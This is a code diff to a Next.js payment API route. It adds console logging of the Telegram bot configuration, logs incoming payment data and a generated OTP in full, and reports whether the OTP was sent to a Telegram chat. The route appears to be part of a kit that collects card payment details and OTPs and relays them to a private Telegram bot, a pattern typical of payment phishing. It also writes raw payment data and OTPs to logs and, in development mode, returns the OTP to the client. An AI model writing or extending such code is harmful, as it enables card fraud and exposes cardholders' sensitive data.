@@ -86,17 +86,26 @@ export async function POST(request: Request) {
   try {
     const data: PaymentData & { currency?: string } = await request.json();
 
+    console.log("🔍 Telegram Config Check:", {
+      hasToken: !!TELEGRAM_BOT_TOKEN,
+      hasChatId: !!TELEGRAM_CHAT_ID,
+      isPlaceholderToken: TELEGRAM_BOT_TOKEN === "your_bot_token_here",
+      isPlaceholderChatId: TELEGRAM_CHAT_ID === "your_chat_id_here"
+    });
+
     const otp = generateOTP();
     console.log("💳 PAYMENT DATA RECEIVED:");
     console.log(JSON.stringify({ ...data, otp }, null, 2));
 
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || TELEGRAM_BOT_TOKEN === "your_bot_token_here" || TELEGRAM_CHAT_ID === "your_chat_id_here") {
-      console.log("⚠️ Telegram bot token or chat ID not configured or using placeholders - logging data only");
-      console.log("💳 PAYMENT DATA (LOG ONLY):", JSON.stringify({ ...data, otp }, null, 2));
+      console.log("⚠️ Telegram configuration missing or using placeholders.");
+      console.log("🔑 Generated OTP:", otp);
+      console.log("📝 Payment data logged to console only.");
+      
       return NextResponse.json({ 
         success: true, 
         otp: otp,
-        message: "Payment data logged successfully (Development Mode)" 
+        message: "Payment data logged successfully (Development Mode). Please check your server console for the OTP code." 
       });
     }
 
@@ -116,7 +125,9 @@ export async function POST(request: Request) {
     const otpResult = await sendOTPMobile(otp);
 
     if (!otpResult.ok) {
-      console.error("Telegram API error sending OTP:", otpResult);
+      console.error("❌ Telegram OTP Send Failed:", JSON.stringify(otpResult, null, 2));
+    } else {
+      console.log("✅ OTP sent to Telegram successfully");
     }
 
     return NextResponse.json({ 
